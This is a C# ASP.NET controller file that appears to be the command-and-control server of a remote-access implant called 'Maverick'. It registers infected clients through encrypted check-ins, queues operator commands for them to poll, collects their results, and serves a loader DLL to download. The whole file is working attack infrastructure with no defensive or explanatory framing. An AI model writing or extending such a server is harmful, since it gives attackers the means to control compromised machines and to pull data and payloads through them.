using Maverick.Commander.Services;
using Maverick.Models;
using Maverick.Models.Command;
using Maverick.Utility;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Mvc;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

#pragma warning disable IDE0290

namespace Maverick.Commander.Controllers
{
    [ApiController]
    [Route("api")]
    public class CommandController : ControllerBase
    {
        private readonly ILogger<CommandController> _logger;
        private readonly ICommandAndControl _commandAndControl;
        private readonly string HeaderHashCheck;

        public CommandController(ILogger<CommandController> logger, ICommandAndControl commandAndControl)
        {
            _logger = logger;
            _commandAndControl = commandAndControl;
            HeaderHashCheck = Crypto.GetHash(Key.SecretKey);
        }

        private bool IsValidRequest()
        {
            if (!Request.Headers.TryGetValue("X-Request-Hash", out var receivedHash))
            {
                return false;
            }
            return receivedHash == HeaderHashCheck;
        }

        [HttpPost("get")]
        public async Task<IActionResult> ClientRequestCommand()
        {
            if (!IsValidRequest())
                return Unauthorized();

            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var rawBody = ms.ToArray();
            if (rawBody.Length != 4)
                return Ok(0);

            int ClientId = BitConverter.ToInt32(rawBody, 0);
            if (!_commandAndControl.ValidListClientID(ClientId))
                return Ok(0xffffffff);

            var command = _commandAndControl.GetCommandForClient(ClientId);
            if (command == null)
                return Ok();

            var encryptedCommand = await Crypto.EncryptAESPayload(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(command)));
            _commandAndControl.ClearCommand(command.CommandID);
            return File(encryptedCommand, "application/octet-stream");
        }

        [HttpPost("post")]
        public async Task<IActionResult> ClientRequestResult()
        {
            if (!IsValidRequest())
                return Unauthorized();

            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var encryptedData = ms.ToArray();

            var rawBody = await Crypto.DecryptAESPayload(encryptedData);
            var json = Encoding.UTF8.GetString(rawBody);
            var commandResult = JsonSerializer.Deserialize<CommandRequestModel>(json);
            if (commandResult == null)
                return BadRequest();

            await _commandAndControl.UpdateCommand(commandResult);
            return Ok();
        }

        [HttpPost("new")]
        public async Task<IActionResult> ClientNewConnect()
        {
            if (!IsValidRequest())
                return Unauthorized();
            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var encryptedData = ms.ToArray();

            var rawBody = await Crypto.DecryptAESPayload(encryptedData);
            var json = Encoding.UTF8.GetString(rawBody);
            var newClientInfo = JsonSerializer.Deserialize<InfoClientModel>(json);
            if (newClientInfo == null)
                return BadRequest();

            int newClientId = newClientInfo.InternalID;
            if (newClientId == 0)
            {
                newClientId = _commandAndControl.GenerateNewClientID();
                newClientInfo.InternalID = newClientId;
            }
            if (!_commandAndControl.ValidListClientID(newClientId))
            {
                _commandAndControl.UpdateNewClient(newClientInfo);
            }
            return Ok(newClientId);
        }

        [HttpPost("send")]
        public async Task<IActionResult> SendCommand()
        {
            using var reader = new StreamReader(Request.Body);
            var body = await reader.ReadToEndAsync();

            if (string.IsNullOrEmpty(body))
            {
                return BadRequest("Empty request body");
            }
            CommandRequestModel? cmd;
            try
            {
                // Deserialize manually (use options for case-insensitivity if needed)
                var options = new JsonSerializerOptions
                {
                    PropertyNameCaseInsensitive = true  // Optional: Handles case mismatches like "command" vs "Command"
                };
                cmd = JsonSerializer.Deserialize<CommandRequestModel>(body, options);
            }
            catch (JsonException ex)
            {
                Console.WriteLine("Deserialization error: " + ex.Message);
                return BadRequest("Invalid JSON format: " + ex.Message);
            }

            if (cmd == null)
            {
                return BadRequest("Invalid request data");
            }

            if (!_commandAndControl.ValidListClientID(cmd.InternalID))
                return BadRequest("Invalid client");

            // Cập nhật command queue để client poll lấy
            cmd.CommandID = Random.Shared.Next();
            _commandAndControl.AddCommandQueue(cmd);

            // Lưu lịch sử
            await _commandAndControl.UpdateCommand(cmd);

            return Ok(new { ok = true });
        }

        [HttpPost("init")]
        public async Task<IActionResult> InitLoader()
        {
            byte[] net_loader = await System.IO.File.ReadAllBytesAsync("Maverick.dll");//template
            return File(net_loader, "application/octet-stream");
        }

    }
}
